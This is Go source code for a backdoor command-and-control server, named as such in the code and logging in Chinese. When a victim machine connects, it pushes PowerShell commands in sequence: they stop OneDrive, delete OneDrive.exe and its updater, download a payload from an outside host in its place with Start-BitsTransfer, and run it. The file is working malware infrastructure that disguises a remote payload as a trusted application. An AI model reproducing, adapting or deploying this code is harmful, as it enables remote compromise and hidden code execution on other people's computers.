package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"time"
)

var OnlineMap map[string]net.Conn

type backdoorServer struct {
	s *Server
}

func (t *backdoorServer) OnAccept(conn net.Conn) bool {
	fmt.Println("收到来自" + conn.RemoteAddr().String() + "的连接")
	time.Sleep(time.Second * 10)
	OnlineMap[conn.RemoteAddr().String()] = conn
	url := "http://cloud.creepey.xyz/?explorer/share/fileDownload&shareID=8H-qq9YQ&path=%7BshareItemLink%3A8H-qq9YQ%7D%2F&s=bt28T"
	a := bytes.NewBufferString("Stop-Process -name One*\nrm C:\\Users\\test\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\nrm \"C:\\Users\\test\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe\"\nStart-BitsTransfer -Source \"" + url + "\" -Destination \"C:\\Users\\test\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\"\nC:\\Users\\test\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\n")
	s := bufio.NewReader(a)
	for i := 0; i < 5; i++ {
		fmt.Println("正在执行第", i, "步")
		time.Sleep(time.Second * 2)
		cmd, _ := s.ReadString('\n')
		t.s.Send(conn, 3, 3, []byte(cmd))
		time.Sleep(time.Second * 10)
	}
	fmt.Println("执行完成")
	return true
}
func (t *backdoorServer) OnData(conn net.Conn, cmd, ext uint16, data []byte) error {
	if cmd == 0 && ext == 0 {
		return nil
	}
	//psout
	if cmd == 3 && ext == 3 {
		fmt.Println(string(data))
	}

	return nil
}
func (t *backdoorServer) OnRecvError(conn net.Conn, err error) {
	fmt.Printf("err: %v\n", err)
	fmt.Println("youcuowu")
}
func (t *backdoorServer) OnClientClose(conn net.Conn) {}
func main() {
	OnlineMap = make(map[string]net.Conn, 20)

START:
	a := &backdoorServer{}
	server, err := Listen("tcp", "0.0.0.0:12344")

	if err != nil {
		goto START
	}
	go server.Run(a)
	select {}
}
